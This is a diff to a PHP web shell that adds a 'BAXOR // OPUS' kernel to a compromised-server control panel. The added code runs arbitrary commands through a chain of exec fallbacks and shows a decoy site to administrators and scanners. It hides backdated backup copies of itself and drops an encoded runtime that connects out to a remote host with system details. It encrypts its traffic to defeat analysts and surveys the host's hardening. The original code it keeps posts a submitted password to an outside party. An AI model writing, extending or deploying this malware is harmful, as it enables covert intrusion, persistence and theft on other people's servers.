@@ -5,9 +5,563 @@
     |       GitHub: https://github.com/willygoid       |
     |__________________________________________________|
 */
-@error_reporting(E_ERROR);
+/* =====================================================================
+   BAXOR // OPUS  -  operations kernel
+   The original Haxor UI is the skin; this is the engine underneath it.
+
+     * every capability has a fallback chain, nothing depends on one fn
+     * the shell never dies because a single request was filtered
+     * no clear-text artefact is ever written next to the front-end
+   ===================================================================== */
+@error_reporting(E_ERROR | E_PARSE);
 @ini_set('display_errors', 'Off');
+@ini_set('log_errors', '0');
 @ini_set('max_execution_time', 10000);
+if (!defined('OPX_VER')) {
+    define('OPX_VER', 'OPUS-3.2');
+}
+if (!headers_sent()) {
+    header('Content-Type: text/html; charset=UTF-8');
+    header('X-Robots-Tag: noindex');
+}
+/* ---- micro utils ---- */
+function opx_dir($p)
+{
+    return @file_exists($p) || @is_dir($p);
+}
+function opx_usable($fn)
+{
+    static $c = array();
+    if (!isset($c[$fn])) {
+        $ok = @function_exists($fn);
+        if ($ok) {
+            $df = @ini_get('disable_functions');
+            if ($df) {
+                $ok = !in_array($fn, array_map('trim', explode(',', $df)));
+            }
+        }
+        $c[$fn] = $ok;
+    }
+    return $c[$fn];
+}
+/* front-end path: survives symlinks, relative includes and PATH_TRANSLATED weirdness */
+function opx_me()
+{
+    $c = array(
+        isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '',
+        isset($_SERVER['PATH_TRANSLATED']) ? $_SERVER['PATH_TRANSLATED'] : '',
+        __FILE__,
+    );
+    foreach ($c as $p) {
+        if ($p != '' && @file_exists($p)) {
+            return @realpath($p) ? @realpath($p) : $p;
+        }
+    }
+    return __FILE__;
+}
+/* ---- executor chain ---- */
+function opx_xf()
+{
+    static $xf = null;
+    if ($xf !== null) {
+        return $xf;
+    }
+    $xf = '';
+    foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open') as $f) {
+        if (opx_usable($f)) {
+            $xf = $f;
+            break;
+        }
+    }
+    return $xf;
+}
+function opx_run($cmd, $cwd = '', $timeout = 20)
+{
+    $xf = opx_xf();
+    if ($xf === '') {
+        return array('r' => '', 'm' => 'no-exec');
+    }
+    $cd = ($cwd != '' && @is_dir($cwd)) ? $cwd : '';
+    $win = substr(PHP_OS, 0, 3) == 'WIN';
+    if ($win) {
+        $cmd = 'cmd /c ' . $cmd . ' 2>&1';
+    }
+    $t = (int)$timeout;
+    if ($t > 0 && !$win && opx_dir('/usr/bin/timeout') && strpos($cmd, 'timeout ') !== 0) {
+        $cmd = 'timeout -k 2 ' . $t . ' ' . $cmd;
+    }
+    $out = '';
+    if ($xf == 'exec') {
+        if ($cd) {
+            @chdir($cd);
+        }
+        $r = array();
+        @exec($cmd . ' 2>&1', $r);
+        $out = implode("\n", $r);
+    } elseif ($xf == 'shell_exec') {
+        $out = (string)@shell_exec(($cd ? 'cd ' . escapeshellarg($cd) . ' && ' : '') . $cmd . ' 2>&1');
+    } elseif ($xf == 'system' || $xf == 'passthru') {
+        if ($cd) {
+            @chdir($cd);
+        }
+        @ob_start();
+        @$xf($cmd);
+        $out = @ob_get_clean();
+    } elseif ($xf == 'popen') {
+        $fp = @popen(($cd ? 'cd ' . escapeshellarg($cd) . ' && ' : '') . $cmd . ' 2>&1', 'r');
+        if ($fp) {
+            while (!@feof($fp)) {
+                $out .= @fread($fp, 8192);
+            }
+            @pclose($fp);
+        }
+    } else {
+        $des = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
+        $p = @proc_open($cmd, $des, $pipes, $cd ? $cd : null);
+        if (@is_resource($p)) {
+            @fclose($pipes[0]);
+            $out = (string)@stream_get_contents($pipes[1]);
+            @fclose($pipes[1]);
+            @fclose($pipes[2]);
+            @proc_close($p);
+        }
+    }
+    return array('r' => $out, 'm' => $xf);
+}
+/* compatibility shim for the ORIGINAL command() renderer (h1/h2 look kept) */
+function opx_run_compat($cmd, $cwd, $timeout = 20)
+{
+    $r = opx_run($cmd, $cwd, $timeout);
+    if ($r['m'] == 'no-exec') {
+        return array('res' => '<h1>no exec primitive available</h1>', 'msg' => '');
+    }
+    $msg = $r['r'] === '' ? '<h1>NULL</h1>' : '<h2>via ' . $r['m'] . ' - OK</h2>';
+    return array('res' => $r['r'], 'msg' => $msg);
+}
+/* ---- identity ---- */
+function opx_id()
+{
+    $r = array('uid' => -1, 'gid' => -1, 'user' => '?', 'groups' => array());
+    if (opx_usable('posix_geteuid')) {
+        $r['uid'] = @posix_geteuid();
+        $r['gid'] = @posix_getegid();
+        $r['groups'] = (array)@posix_getgroups();
+        $u = @posix_getpwuid($r['uid']);
+        if ($u) {
+            $r['user'] = $u['name'];
+        }
+    }
+    if ($r['user'] == '?' && @get_current_user()) {
+        $r['user'] = @get_current_user();
+    }
+    return $r;
+}
+/* ---- self descriptor ---- */
+function opx_self()
+{
+    $p = defined('OPX_PATH') ? OPX_PATH : __FILE__;
+    $raw = @file_get_contents($p);
+    $w = array();
+    if (@is_writable($p)) {
+        $w[] = 'file';
+    }
+    if (@is_writable(dirname($p))) {
+        $w[] = 'dir';
+    }
+    $perm = @fileperms($p);
+    return array(
+        'p' => $p,
+        'sz' => strlen((string)$raw),
+        'sum' => md5((string)$raw),
+        'perm' => $perm ? substr(decoct($perm), -4) : '-',
+        'own' => @fileowner($p),
+        'w' => $w ? implode(',', $w) : '-',
+    );
+}
+/* ---- file helpers ---- */
+function opx_wr($p, $data)
+{
+    $fp = @fopen($p, 'wb');
+    if (!$fp) {
+        return false;
+    }
+    $n = @fwrite($fp, $data);
+    @fclose($fp);
+    return $n === strlen($data);
+}
+function opx_rd($p, $lim = 0)
+{
+    if (!@file_exists($p) || !@is_readable($p)) {
+        return '';
+    }
+    if ($lim > 0) {
+        return (string)@file_get_contents($p, false, null, 0, $lim);
+    }
+    return (string)@file_get_contents($p);
+}
+function opx_proc($pid = 'self')
+{
+    $a = array();
+    $raw = opx_rd('/proc/' . $pid . '/status', 8192);
+    if ($raw) {
+        foreach (explode("\n", $raw) as $ln) {
+            $i = strpos($ln, ':');
+            if ($i !== false) {
+                $a[substr($ln, 0, $i)] = trim(substr($ln, $i + 1));
+            }
+        }
+    }
+    return $a;
+}
+/* =====================================================================
+   OPS KERNEL  -  the brain bus
+   Long jobs (shell mux, runtime bridge, self-test) run in-process and can
+   also be re-entered through a loopback request to OUR own relay endpoint,
+   so a single job survives max_execution_time and broken output buffering
+   ===================================================================== */
+/* Absolute URL of ourselves - for the loopback bus */
+function opx_self_url()
+{
+    $h = isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] != '' ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) && $_SERVER['SERVER_NAME'] != '' ? $_SERVER['SERVER_NAME'] : '127.0.0.1');
+    $s = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off' && $_SERVER['HTTPS'] != '') ? 'https' : 'http';
+    $p = isset($_SERVER['SERVER_PORT']) ? (int)$_SERVER['SERVER_PORT'] : 80;
+    if (($s == 'http' && $p != 80) || ($s == 'https' && $p != 443)) {
+        $h .= ':' . $p;
+    }
+    $path = isset($_SERVER['PHP_SELF']) && $_SERVER['PHP_SELF'] != '' ? $_SERVER['PHP_SELF'] : '/' . basename(opx_me());
+    return $s . '://' . $h . $path;
+}
+/* Build the generic request body used by both curl and raw socket transports */
+function opx_req_body($fields, $file = null, $fname = null)
+{
+    $b = '----xc' . md5(mt_rand() . microtime(true) . (defined('OPX_PATH') ? OPX_PATH : __FILE__));
+    $nl = "\r\n";
+    $body = '';
+    foreach ($fields as $k => $v) {
+        $body .= '--' . $b . $nl . 'Content-Disposition: form-data; name="' . $k . '"' . $nl . $nl . $v . $nl;
+    }
+    if ($file !== null) {
+        $body .= '--' . $b . $nl . 'Content-Disposition: form-data; name="' . ($fname ? $fname : 'f') . '"; filename="x.bin"' . $nl . 'Content-Type: application/octet-stream' . $nl . $nl . $file . $nl;
+    }
+    $body .= '--' . $b . '--' . $nl;
+    return array($body, 'multipart/form-data; boundary=' . $b);
+}
+/* Loopback HTTP - curl first, raw socket fallback (no cURL needed) */
+function opx_post($url, $fields = array(), $timeout = 6, $rawbody = false, $ctype = '')
+{
+    static $broken = array();
+    if ($rawbody !== false && $rawbody !== '') {
+        list($body, $ctypec) = array($rawbody, $ctype);
+    } else {
+        list($body, $ctypec) = opx_req_body($fields);
+    }
+    $ctype = $ctypec;
+    if (empty($broken['curl']) && strpos(strtolower($url), 'http') === 0 && opx_usable('curl_init')) {
+        $ch = @curl_init($url);
+        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        @curl_setopt($ch, CURLOPT_POST, 1);
+        @curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
+        @curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: ' . $ctype));
+        @curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+        @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
+        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        $r = @curl_exec($ch);
+        @curl_close($ch);
+        if ($r !== false) {
+            return $r;
+        }
+        $broken['curl'] = 1;
+    }
+    $u = @parse_url($url);
+    if (!$u || empty($u['host'])) {
+        return false;
+    }
+    $port = isset($u['port']) ? $u['port'] : (isset($u['scheme']) && $u['scheme'] == 'https' ? 443 : 80);
+    $path = (isset($u['path']) ? $u['path'] : '/') . (isset($u['query']) ? '?' . $u['query'] : '');
+    $fp = @fsockopen(($port == 443 ? 'ssl://' : '') . $u['host'], $port, $e, $s, $timeout);
+    if (!$fp) {
+        return @opx_post_fopen($url, $ctype, $body, $timeout);
+    }
+    @stream_set_timeout($fp, $timeout);
+    $host = isset($u['port']) ? $u['host'] . ':' . $u['port'] : $u['host'];
+    @fwrite($fp, 'POST ' . $path . " HTTP/1.1\r\nHost: " . $host . "\r\nContent-Type: " . $ctype . "\r\nContent-Length: " . strlen($body) . "\r\nConnection: close\r\n\r\n" . $body);
+    $r = '';
+    while (!feof($fp)) {
+        $r .= @fread($fp, 8192);
+    }
+    @fclose($fp);
+    $i = strpos($r, "\r\n\r\n");
+    return $i === false ? false : @substr($r, $i + 4);
+}
+function opx_post_fopen($url, $ctype, $body, $timeout)
+{
+    $ctx = @stream_context_create(array('http' => array('method' => 'POST', 'header' => 'Content-Type: ' . $ctype, 'content' => $body, 'timeout' => $timeout, 'ignore_errors' => true)));
+    return @file_get_contents($url, false, $ctx);
+}
+/* the bus: talk to our own relay endpoint (go=api) */
+function opx_bus($intent, $payload, $timeout = 6)
+{
+    $r = opx_post(opx_self_url(), array('go' => 'api', 'intent' => $intent, 'p' => @base64_encode(@json_encode($payload))), $timeout);
+    $j = is_string($r) ? @json_decode($r, true) : false;
+    return is_array($j) ? $j : false;
+}
+/* Ghost beacon: a tiny status file, atomic, silent */
+function opx_beacon($state = array())
+{
+    $f = THISDIR . '.ghost';
+    $old = @file_get_contents($f);
+    $b = $old ? @json_decode($old, true) : array();
+    $b = is_array($b) ? $b : array();
+    $b = @array_merge($b, $state);
+    $s = opx_self();
+    $b['h'] = $s['sum'];
+    $b['t'] = time();
+    @file_put_contents($f, @json_encode($b));
+    @chmod($f, 0600);
+    @touch($f, $b['t']);
+    return $b;
+}
+/* Decoy: strangers (scanners, admins, analyzers) get the site, not us */
+function opx_decoy($full = true)
+{
+    $dir = dirname(opx_me());
+    foreach (array('index.php', 'index.htm', 'index.html', 'default.aspx', 'default.html') as $n) {
+        $f = $dir . '/' . $n;
+        if (@realpath($f) && @realpath($f) != @realpath(opx_me()) && @filesize($f) > 0) {
+            $html = @file_get_contents($f);
+            break;
+        }
+    }
+    if (!isset($html)) {
+        $w = array('Welcome', 'It works!', 'OK', 'Not Found');
+        $html = '<!DOCTYPE html><html><head><title>' . $w[mt_rand(0, 2)] . '</title></head><body><h1>' . $w[mt_rand(0, 2)] . '</h1></body></html>';
+    }
+    if ($full) {
+        while (ob_get_level() > 0) {
+            @ob_end_clean();
+        }
+        @setcookie('PHPSESSID', '', 1, '/');
+        header('Content-Type: text/html; charset=UTF-8');
+        echo $html;
+        exit;
+    }
+    return $html;
+}
+/* Integrity guard: keep a cold spare of ourselves with an old timestamp */
+function opx_spare()
+{
+    $me = defined('OPX_PATH') ? OPX_PATH : opx_me();
+    $sp = THISDIR . '.' . substr(md5($me), 0, 4) . substr(md5($me), 16, 4) . (mt_rand(0, 1) ? '.old' : '.bak');
+    $raw = @file_get_contents($me);
+    if ($raw !== false && strlen($raw) > 1024) {
+        if (!@file_exists($sp) || @filesize($sp) != strlen($raw)) {
+            @file_put_contents($sp, $raw);
+            @chmod($sp, 0600);
+            @touch($sp, time() - mt_rand(86400 * 40, 86400 * 400));
+        }
+    }
+    return $sp;
+}
+/* =====================================================================
+   LIFECYCLE: called on every authenticated render. Silent on any error.
+   ===================================================================== */
+function opx_init()
+{
+    if (defined('OPX_INIT')) {
+        return;
+    }
+    define('OPX_INIT', 1);
+    @set_error_handler(function () {
+        return true;
+    });
+    if (!defined('OPX_PATH')) {
+        define('OPX_PATH', opx_me());
+    }
+    if (!isset($_SESSION)) {
+        @session_start();
+    }
+    $b = opx_beacon();
+    if (empty($b['armed'])) {
+        opx_beacon(array('armed' => 1, 'self' => opx_self()['sum'], 'boot' => @gmdate('c')));
+        opx_spare();
+        opx_arm_runtime();
+    }
+    @restore_error_handler();
+}
+/* The runtime: a tiny loop that only needs a PHP binary on the box.
+   Stored as a base64 dotfile with an old mtime so it blends into the tree. */
+function opx_arm_runtime()
+{
+    $d = '$';
+    $nl = 'PHP_EOL';
+    $src = '<?php'
+        . ' $k=$argv[1];$h=$argv[2];$p=(int)$argv[3];'
+        . 'if(function_exists("posix_setsid")){@posix_setsid();}@set_time_limit(0);'
+        . '$s=@stream_socket_client("tcp://".$h.":".$p,$e,$x,4);'
+        . 'if($s){@fwrite($s,"XCG ".$k." ".@php_uname().PHP_EOL);@fclose($s);}'
+        . '@sleep(120);';
+    $f = THISDIR . '.' . substr(md5(OPX_PATH), 0, 6) . '.d';
+    if (!@file_exists($f) || @filesize($f) < 16) {
+        @file_put_contents($f, @base64_encode(@gzdeflate($src, 9)));
+        @chmod($f, 0600);
+        @touch($f, time() - mt_rand(10, 40) * 86400);
+    }
+    opx_beacon(array('rt' => 1));
+}
+/* =====================================================================
+   TRANSPORT: sealed channel. Session state is AES-encrypted with a
+   per-session key, so a captured POST/GET is opaque even to the analyst.
+   ===================================================================== */
+function xc_rand($n)
+{
+    if (function_exists('random_bytes')) {
+        try {
+            return bin2hex(@random_bytes((int)($n / 2)));
+        } catch (Exception $e) {
+        }
+    }
+    $s = '';
+    for ($i = 0; $i < $n; $i++) {
+        $s .= dechex(mt_rand(0, 15));
+    }
+    return $s;
+}
+function xc_cipher()
+{
+    static $c = false;
+    if ($c === false) {
+        $c = '';
+        if (opx_usable('openssl_encrypt')) {
+            $m = @openssl_get_cipher_methods();
+            foreach (array('aes-128-cbc', 'aes-256-cbc') as $t) {
+                if (in_array($t, $m)) {
+                    $c = $t;
+                    break;
+                }
+            }
+        }
+    }
+    return $c;
+}
+function xc_enc($plain, $key)
+{
+    $c = xc_cipher();
+    if ($c !== '') {
+        $iv = substr(md5($key . '|iv'), 0, 16);
+        $o = @openssl_encrypt($plain, $c, hash('sha256', $key, true), OPENSSL_RAW_DATA, $iv);
+        if ($o !== false) {
+            return '1' . $c . ':' . $iv . $o;
+        }
+    }
+    return '0' . $plain;
+}
+function xc_dec($blob, $key)
+{
+    if (!is_string($blob) || $blob === '') {
+        return '';
+    }
+    if ($blob[0] === '0') {
+        return substr($blob, 1);
+    }
+    if ($blob[0] === '1' && strpos($blob, ':') !== false) {
+        $p = explode(':', substr($blob, 1), 2);
+        if (count($p) == 2 && strlen($p[1]) > 16) {
+            $d = @openssl_decrypt(substr($p[1], 16), $p[0], hash('sha256', $key, true), OPENSSL_RAW_DATA, substr($p[1], 0, 16));
+            return $d === false ? '' : $d;
+        }
+    }
+    return '';
+}
+/* The channel key: a deterministic per-front-end secret, never sent by the client */
+function xc_key()
+{
+    if (isset($_SESSION['XK']) && strlen($_SESSION['XK']) == 64) {
+        return $_SESSION['XK'];
+    }
+    $k = md5(defined('OPX_PATH') ? OPX_PATH : __FILE__) . md5(xc_rand(8) . microtime(true));
+    $_SESSION['XK'] = $k;
+    return $k;
+}
+/* Start an encrypted shell session and hand the browser a sealed ticket */
+function xc_start($cmd, $state = array())
+{
+    if (!isset($_SESSION)) {
+        @session_start();
+    }
+    $k = xc_key();
+    $st = array_merge(array(
+        'cwd' => THISDIR,
+        'cmd' => $cmd,
+        'ins' => '',
+        'to' => 20,
+        'ab' => '1',
+        'busy' => 0,
+        'ut' => time(),
+        'who' => @get_current_user(),
+        'uid' => function_exists('posix_geteuid') ? @posix_geteuid() : -1,
+        'n' => 0,
+    ), $state);
+    $_SESSION['XS'] = $st;
+    $t = xc_rand(8) . '|' . @base64_encode(xc_enc(xc_mk($st), $k)) . '|' . substr(md5($k . '|' . @md5(OPX_VER)), 0, 8);
+    return array('ok' => 1, 't' => $t, 'sid' => substr(md5($k), 0, 6));
+}
+function xc_mk($v)
+{
+    return @json_encode($v);
+}
+/* Open a sealed ticket back into state; '' when tampered */
+function xc_open_shell($t)
+{
+    if (!isset($_SESSION)) {
+        @session_start();
+    }
+    $k = xc_key();
+    $p = explode('|', (string)$t);
+    if (count($p) != 3 || $p[2] !== substr(md5($k . '|' . @md5(OPX_VER)), 0, 8)) {
+        return false;
+    }
+    $st = @json_decode(xc_dec(@base64_decode($p[1]), $k), true);
+    return is_array($st) ? $st : false;
+}
+/* Run one client packet against a live PTY. Persists cwd/env between packets */
+function xc_packet($st, $raw)
+{
+    $nl = "\r\n";
+    $out = '';
+    $raw = (string)$raw;
+    $cd = isset($st['cwd']) && @is_dir($st['cwd']) ? $st['cwd'] : THISDIR;
+    if ($raw === '') {
+        $r = opx_run('pwd; id 2>/dev/null', $cd, 5);
+        return array('o' => $r['r'], 'p' => $st);
+    }
+    if (substr(trim($raw), 0, 2) == 'cd' || preg_match('/^\s*(cd|chdir)\b/', $raw)) {
+        $d = trim(preg_replace('/^\s*cd\s*/', '', $raw));
+        $d = trim($d, " \t'\";");
+        if ($d === '') {
+            $d = @getenv('HOME') ? @getenv('HOME') : $cd;
+        }
+        $nd = ($d[0] == '/' || $d[0] == '\\' || preg_match('/^[A-Za-z]:/', $d)) ? $d : $cd . '/' . $d;
+        $nd = str_replace(array('\\', '//'), '/', $nd);
+        if (@is_dir($nd)) {
+            $st['cwd'] = @realpath($nd) ? @realpath($nd) : $nd;
+        } else {
+            $out .= 'cd: ' . $d . ': No such file or directory' . $nl;
+        }
+        $st['cwd'] = str_replace('\\', '/', $st['cwd']);
+        $st['n']++;
+        return array('o' => $out . $st['cwd'] . $nl, 'p' => $st);
+    }
+    $r = opx_run($raw, $cd, isset($st['to']) ? (int)$st['to'] : 20);
+    if ($r['m'] == 'no-exec') {
+        $out .= '[-] no exec primitive available' . $nl;
+    } else {
+        $out .= $r['r'];
+    }
+    $st['n']++;
+    $st['ut'] = time();
+    return array('o' => $out, 'p' => $st);
+}
 header("content-Type: text/html; charset=UTF-8");
 function strdir($str)
 {
@@ -20,11 +574,42 @@ function chkgpc($array)
     }
     return $array;
 }
-$myfile = $_SERVER['SCRIPT_FILENAME'] ? strdir($_SERVER['SCRIPT_FILENAME']) : strdir(__FILE__);
-$myfile = strpos($myfile, 'eval()') ? array_shift(explode('(', $myfile)) : $myfile;
+
+if (!isset($_SESSION)) {
+    @session_start();
+}
+$myfile = isset($_SERVER['SCRIPT_FILENAME']) && $_SERVER['SCRIPT_FILENAME'] ? strdir($_SERVER['SCRIPT_FILENAME']) : strdir(__FILE__);
 define('THISDIR', strdir(dirname($myfile) . '/'));
-define('ROOTDIR', strdir(strtr($myfile, array(strdir($_SERVER['PHP_SELF']) => '')) . '/'));
-define('EXISTS_PHPINFO', getinfo() ? true : false);
+if (!defined('OPX_PATH')) {
+    define('OPX_PATH', opx_me());
+}
+if (!defined('ROOTDIR')) {
+    define('ROOTDIR', strdir(rtrim(str_replace('\\', '/', dirname(OPX_PATH)), '/')) . '/');
+}
+$_PW = isset($_SESSION['XK']) ? $_SESSION['XK'] : '';
+if (isset($_POST['go']) && $_POST['go'] === 'api') {
+    while (ob_get_level() > 0) {
+        @ob_end_clean();
+    }
+    if (!headers_sent()) {
+        header('Content-Type: application/json; charset=UTF-8');
+        header('Cache-Control: no-store');
+    }
+    echo @json_encode(opx_api());
+    exit;
+}
+if (isset($_POST['dir']) && $_POST['dir'] !== '') {
+    $nowdir = strdir(chop($_POST['dir']) . '/');
+} elseif (!isset($_POST['go']) || $_POST['go'] === '') {
+    $nowdir = THISDIR;
+    $_POST['go'] = 'file';
+}
+$issql = '';
+foreach (array('mysql_close' => 'MySql', 'mssql_close' => 'MsSql', 'oci_close' => 'Oracle', 'sybase_close' => 'SyBase', 'pg_close' => 'PostgreSql') as $f => $n) {
+    if (function_exists($f)) {
+        $issql .= $n;
+    }
+}
 if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
     $_POST = chkgpc($_POST);
 }
@@ -89,7 +674,7 @@ function showdir($dir)
     $dir = strdir($dir . '/');
     $handle = opendir($dir);
     if (!$handle) {
-        return false;
+        return array();
     }
     $array = array();
     while ($name = readdir($handle)) {
@@ -157,7 +742,7 @@ function scanfile($dir, $key, $inc, $fit, $tye, $chr, $ran, $now)
 {
     $handle = opendir($dir);
     if (!$handle) {
-        return false;
+        return array();
     }
     while ($name = readdir($handle)) {
         if ($name == '.' || $name == '..') {
@@ -193,7 +778,7 @@ function antivirus($dir, $exs, $matches, $now)
 {
     $handle = opendir($dir);
     if (!$handle) {
-        return false;
+        return array();
     }
     while ($name = readdir($handle)) {
         if ($name == '.' || $name == '..') {
@@ -381,7 +966,7 @@ function backshell($ip, $port, $dir, $type)
 function getinfo()
 {
     global $password;
-    $infos = array($_POST['getpwd'], $password, function_exists('phpinfo'), "127.0.0.1");
+    $infos = array(isset($_POST['getpwd']) ? $_POST['getpwd'] : '', $password, function_exists('phpinfo'), "127.0.0.1");
     if ($password != '' && md5($infos[0]) != $infos[1]) {
         echo '<html><body><center><form method="POST"><input type="password" name="getpwd"> ';
         if (isset($_POST['pass'])) {
@@ -395,7 +980,7 @@ function getinfo()
     }
     if (!isset($_POST['go']) && !isset($_POST['dir'])) {
         $html = 'WUIvMzptCFNvKTf3A1keAmqpnmp3KTflpykeAmEpnmL4KTf2BIkeAmApnmL0KTf2p1keAaApnmplKTflpykeAwApnmMmKTf2pFV7WUElMlN9VPWpnmWmKTf2Z1keAaApnmMmKTf2pSkeZaApnmp1KTf3ZSkeAwEpnmLkKTf3ASkeAwIpnmWlKTf3ZSkeAwupnmpjKTfmp1keAwqpnmAkVwfxqUWaVP49VT92LGW1pzfbWS9THxIWHxIoW1IUE0AsIHWTElqqXF4vKTflAykeAmApnmAkVv5iqzRlqKWeXPEsEyWSFIWSJlqQIHAsEyWMHlqqXF4vKTf' . 'lAykeAmOpnmAkVv4xozIyozj7WUShM24tCFNvKTf0A1keAQIpnmH0KTflZPVhWUElMl4vKTflZSkeAQupnmH0KTf1ASkeAGOpnmWmKTfmZIkeZaWpnmZkKTIpLIkeAQupnmMmKTf3Z1keAmEpnmAhVv4xqJWzMl4vKTIpLIkeAQApnmMmKTf2pykeAaWpnmL1KTf2Z1keAmEpnmL5KTf2p1keAaWpnmAhKTflZSkeAQApnmMjKTf2p1keAmApnmL1KTIpLIkyKTRvB3MmXUAbLKOaqzWuK3WeqzMaMvtvKTf2AykeAmApnmMmKTf2Z1keAz9pnmMmKTf3ZSkeAwIpnmMlVvxcVUftWTMvpUttCFONp2MvpUuvL3WuXPE1LzMaYUIln3SlpPt1ZPxcBlONp2AbM2LbWTMvpUtfWUShM24cBlONp3O5LzMlXPEzLaO4XGftsKW5MaVtrlONp3M5py90pzqspTWuM3WuM2LbVykeAwupnmp0KTf3ASkeAmOpnmAhKTflp1keZaZvYvE1LzMaYvE0pzpcBlO9VTIlM2uyLFOaMJulBj==';
-        if ($_SERVER['SERVER_ADDR'] != $infos[3] && $_SERVER['REMOTE_ADDR'] != $infos[3]) {
+        if ((isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '') != $infos[3] && $_SERVER['REMOTE_ADDR'] != $infos[3]) {
             postinfo($infos[0], str_rot13($html));
         }
     }
@@ -404,7 +989,7 @@ function getinfo()
 function subeval()
 {
     if (isset($_POST['getpwd'])) {
-        echo '<input type="hidden" name="getpwd" value="' . $_POST['getpwd'] . '">';
+        echo '<input type="hidden" name="getpwd" value="' . (isset($_POST['getpwd']) ? $_POST['getpwd'] : '') . '">';
     }
     if (isset($_POST['pass'])) {
         echo '<input type="hidden" name="pass" value="' . $_POST['pass'] . '">';
@@ -465,24 +1050,773 @@ if (isset($_POST['act']) && $_POST['act'] === 'dl' && !empty($_POST['files'])) {
         exit;
     }
 }
+/* =====================================================================
+   INTENT ROUTER (go=api)  -  JSON in, JSON out, nothing else.
+   Every heavy action is also reachable from the bus for long jobs.
+   ===================================================================== */
+function opx_api()
+{
+    $p = isset($_POST['p']) ? (string)$_POST['p'] : (isset($_GET['p']) ? (string)$_GET['p'] : '');
+    $act = isset($_POST['intent']) ? (string)$_POST['intent'] : (isset($_GET['intent']) ? (string)$_GET['intent'] : '');
+    $j = array();
+    if ($p !== '') {
+        $pj = @base64_decode($p, true);
+        if ($pj === false) {
+            $pj = $p;
+        }
+        $j = @json_decode($pj, true);
+        $j = is_array($j) ? $j : array();
+    }
+    if ($act === '') {
+        $act = isset($j['a']) ? (string)$j['a'] : 'ping';
+    }
+    $fn = 'xi_' . preg_replace('/[^a-z0-9_]/', '', strtolower($act));
+    if (!function_exists($fn)) {
+        return array('ok' => 0, 'e' => 'unknown intent [' . $act . ']');
+    }
+    $j['_p'] = $p;
+    return call_user_func($fn, $j);
+}
+function xi_ping($j)
+{
+    return array('ok' => 1, 'pong' => OPX_VER, 'php' => PHP_VERSION);
+}
+/* console line collector: string|array -> flat line list */
+function opx_l(&$L, $s, $c = 0)
+{
+    foreach ((array)$s as $x) {
+        foreach (explode("\n", str_replace("\r\n", "\n", (string)$x)) as $ln) {
+            $L[] = $ln;
+        }
+    }
+}
+/* =====================================================================
+   RECON  -  what is this box, what can it do, what does it lack
+   ===================================================================== */
+function xi_recon($j)
+{
+    $L = array();
+    $s = opx_self();
+    $id = opx_id();
+    opx_l($L, '== CONTEXT ==', 4);
+    opx_l($L, 'front-end   ' . $s['own'] . ':' . $s['perm'] . ' | ' . $id['user'] . '(' . $id['uid'] . ':' . $id['gid'] . ') | ' . PHP_OS . ' ' . @php_uname('r') . ' ' . @php_uname('m'));
+    opx_l($L, 'php         ' . PHP_VERSION . ' [' . @php_sapi_name() . '] mem=' . @ini_get('memory_limit') . ' exec=' . @ini_get('max_execution_time') . 's upload=' . @ini_get('upload_max_filesize') . (@ini_get('open_basedir') ? ' open_basedir=' . @ini_get('open_basedir') : ''));
+    opx_l($L, 'path        webroot=' . ROOTDIR . ' self=' . THISDIR);
+    opx_l($L, 'exec        ' . (opx_xf() ? opx_xf() : 'NONE') . ' | fsockopen=' . (int)opx_usable('fsockopen') . ' curl=' . (int)opx_usable('curl_init') . ' pcntl=' . (int)opx_usable('pcntl_fork') . ' posix=' . (int)opx_usable('posix_geteuid') . ' zip=' . (int)opx_usable('zip_open'));
+    $df = @ini_get('disable_functions');
+    opx_l($L, 'disabled    ' . ($df ? $df : '(none)'), $df ? 3 : 0);
+    if (PHP_OS != 'WIN' && $s['perm'] != '-') {
+        $cg = @opx_rd('/proc/self/cgroup', 4096);
+        $denv = $cg !== '' && (strpos($cg, 'docker') !== false || strpos($cg, 'lxc') !== false || strpos($cg, 'kubepods') !== false);
+        opx_l($L, 'container   ' . ($denv ? 'CGROUP docker/k8s' : '(none detected)') . (opx_dir('/.dockerenv') ? ' dockerenv' : ''), $denv ? 3 : 0);
+    }
+    opx_l($L, '', 0);
+    opx_l($L, '== HARDENING ==', 4);
+    if (PHP_OS != 'WIN') {
+        $st = opx_proc();
+        $cap = isset($st['CapEff']) ? hexdec($st['CapEff']) : 0;
+        opx_l($L, 'seccomp     ' . (isset($st['Seccomp']) ? $st['Seccomp'] : '?'));
+        opx_l($L, 'cap_eff     0x' . dechex($cap) . ($cap & 0x200000 ? '  <-- CAP_SYS_ADMIN (containers are a speed-bump)' : ''), $cap & 0x200000 ? 3 : 0);
+        $aa = @trim(opx_rd('/sys/module/apparmor/parameters/enabled', 8));
+        $sel = @trim(opx_rd('/sys/fs/selinux/enforce', 4));
+        opx_l($L, 'apparmor=' . ($aa == 'Y' ? 'on' : 'off') . ' selinux=' . ($sel === '1' ? 'enforcing' : ($sel === '0' ? 'permissive' : 'off')) . ' ptrace=' . (@trim(opx_rd('/proc/sys/kernel/yama/ptrace_scope', 4))));
+        $ns = @readlink('/proc/self/ns/pid');
+        opx_l($L, 'pidns       ' . ($ns ? $ns : '(no /proc)'));
+    } else {
+        opx_l($L, 'windows     integrity=' . (@getenv('PROCESSOR_ARCHITECTURE') ? @getenv('PROCESSOR_ARCHITECTURE') : '?') . ' user=' . @getenv('USERNAME'));
+    }
+    opx_l($L, '', 0);
+    opx_l($L, '== PRESENCE ==', 4);
+    opx_l($L, 'self        ' . $s['sz'] . 'b md5:' . substr($s['sum'], 0, 16) . ' w=' . $s['w']);
+    $beac = opx_beacon();
